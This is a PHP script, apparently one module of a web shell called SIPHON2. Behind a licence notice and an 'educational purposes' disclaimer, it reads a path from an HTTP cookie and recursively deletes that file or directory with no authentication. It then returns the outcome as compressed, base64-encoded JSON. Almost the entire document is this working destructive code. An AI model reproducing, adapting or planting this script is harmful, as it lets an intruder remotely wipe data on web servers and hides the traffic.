<?php
/*
*     Copyright (c) 2023 SIPHON2
*     All rights reserved.
*    
*     This PHP script, including any associated documentation or files,
*     is the intellectual property of SIPHON2 and is protected by
*     international copyright laws and treaties. Unauthorized copying,
*     distribution, or reproduction of this script, or any portion
*     thereof, is strictly prohibited and may result in severe civil
*     and criminal penalties, as well as liability for monetary damages.
*    
*     You may not use, modify, adapt, merge, sublicense, rent, lease,
*     loan, sell, or otherwise exploit this script without prior
*     written permission from SIPHON2.
*    
*     You are granted a non-exclusive, non-transferable, limited license
*     to use this script solely for non-commercial purposes or for
*     evaluation purposes with the intent to purchase a commercial
*     license. Any use of this script for commercial purposes without
*     a valid commercial license is expressly prohibited.
*    
*     This script is provided "as is" without any warranties of any kind,
*     whether express or implied. SIPHON2 shall not be liable for any
*     damages, including but not limited to, direct, indirect, special,
*     incidental, or consequential damages or loss of data, even if
*     advised of the possibility of such damages.
*    
*     For inquiries regarding licensing or to obtain written permission
*     to use this script for any purpose not expressly permitted in this
*     notice, please contact SIPHON2 at siphon4545@gmail.com.
*
*
*
*
*
*
*     ---------------------------------------------------------------------------

*     #######################################
*     ##  READ CAREFULLY BEFORE PROCEED!!! ##
*     #######################################

*     This PHP script is intended solely for educational purposes.
*     It is meant to be used as a learning resource and for understanding
*     specific concepts.
*    
*     WARNING: Use this script responsibly and at your own risk. The author
*     (SIPHON2) of this script shall not be liable for any direct, indirect,
*     special, incidental, or consequential damages arising from the use or
*     misuse of this script. The users of this script are solely responsible
*     for any consequences that may occur while using this script. Think twice
*     about the potential consequences and ensure that you have proper
*     authorization before using any part of this script in any environment.
*    
*     By using this script, you agree to accept all risks and responsibilities
*     associated with its usage. If you do not agree with these terms, do not
*     proceed to use this script.
*    
*     Please be reminded that you, and only you, are solely responsible for your
*     actions. Always adhere to responsible and ethical coding practices, and
*     ensure to obtain proper authorization before running any script in a live
*     or production environment.

*     YOUR ACTIONS CARRY CONSEQUENCES, SO THINK TWICE BEFORE PROCEEDING.
*     
*     ---------------------------------------------------------------------------
*     
*     REMOVE THE PATH SPECIFIED
*     
*/



$start = microtime(true);

$arguments = (object)[
    'level' => isset($_COOKIE["level"]) ? (int)$_COOKIE["level"] : 9,
    'path' => isset($_COOKIE["path"]) ? $_COOKIE["path"] : null
];

$debug = [];
$status = false;
$function_name = null;

function REMOVE($path)
{
    global $arguments, $start, $status, $debug, $function_name;
    $function_name = __FUNCTION__;
    if (file_exists($path))
    {
        if (is_dir($path))
        {
          $objects = scandir($path);
          foreach ($objects as $object)
          {
            if ($object != "." && $object != "..")
            {
              if (is_dir($path. DIRECTORY_SEPARATOR .$object) && !is_link($path."/".$object))
                REMOVE($path. DIRECTORY_SEPARATOR .$object);
              else
                if (!unlink($path. DIRECTORY_SEPARATOR .$object))
                {
                    @array_push($debug, ['error' => 'Unable to delete file `'.$path.'`']);
                }
            } 
          }
          rmdir($path); 
        }
        else
        {
            if (!unlink($path))
            {
                @array_push($debug, ['error' => 'Unable to delete file `'.$path.'`']); 
            }
        }
    }
    else
    {
        @array_push($debug, ['error' => 'Unable to locate `'.$path.'`']);
    }
    if ($debug != [])
    {
        @array_push($debug, ['error' => 'Unable to remove `'.$path.'`']);   
    }
  }


@REMOVE($arguments->path);

$response = json_encode([
    'status' => empty($debug),
    'time' => microtime(true) - $start,
    'debug' => $debug,
    'operation' => [
        'action' => $function_name,
        'arguments' => $arguments
    ],
    'data' => []
], JSON_UNESCAPED_UNICODE);

echo trim(base64_encode(gzdeflate($response, $arguments->level)), '=');
// echo $response;

?>
